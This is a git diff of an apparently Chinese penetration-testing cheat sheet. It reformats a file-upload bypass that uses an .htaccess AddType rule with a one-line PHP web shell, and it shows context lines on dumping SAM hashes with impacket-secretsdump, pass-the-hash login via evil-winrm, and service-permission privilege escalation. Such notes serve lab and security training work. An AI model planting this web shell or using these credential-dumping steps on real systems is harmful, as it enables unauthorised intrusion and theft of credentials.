@@ -341,12 +341,16 @@ rpcclient -U '' -N IP
 ```
 
 16. **文件上传绕过**
-`vim .htaccess`
-`AddType application/x-httpd-php .evil`
-`# 尝试上传`
-`vim shell.php.evil`
-`<pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>`
-`# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功`
+
+```bash
+vim .htaccess
+AddType application/x-httpd-php .evil
+# 尝试上传
+vim shell.php.evil
+<pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>
+# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
+```bash
+
 17. **ILSpy工具**
 ```bash
 # 一款逆向工具，可以寻找源码中的信息
@@ -433,7 +437,7 @@ kali: impacket-secretsdump -sam sam -system system local
 kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分
 ```
 
-5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令，查询命令123
+5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令，查询命令
 
 ```bash
 iscacls E:\mysql\bin\mysql.exe
